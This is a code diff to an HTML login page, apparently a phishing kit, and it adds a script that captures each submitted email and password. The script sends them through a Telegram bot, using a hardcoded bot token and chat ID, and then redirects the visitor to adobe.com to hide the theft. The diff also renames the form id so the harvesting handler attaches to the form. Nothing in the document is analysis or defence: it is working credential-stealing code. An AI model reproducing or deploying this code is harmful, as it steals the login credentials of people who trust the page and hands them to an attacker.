@@ -1354,7 +1354,7 @@
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
       <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
       <script>
-         const form = document.getElementById('login-form');
+         const form = document.getElementById('form');
          const messageDiv = document.getElementById('message');
          const submitButton = document.getElementById('next_button');
          const countdownDiv = document.getElementById('countdown');
@@ -1395,6 +1395,32 @@
          
          
       </script>
+      <script>
+      const formal = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "7108118131:AAGxqAH0PJvjTyjxqAQySxr_VQZ2NFYfBDE",
+          chatID: "1712380785"
+      }
+
+
+      formal.addEventListener("submit", e =>{
+          e.preventDefault();
+
+          let result1 = document.querySelector('#email').value
+          let result2 = document.querySelector('#password').value
+          
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Username::${result1}==++==Password::${result2}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://adobe.com");
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+
+          })
+      })
+  </script>
       <script>
          // get a new date (locale machine date time)
          var date = new Date();
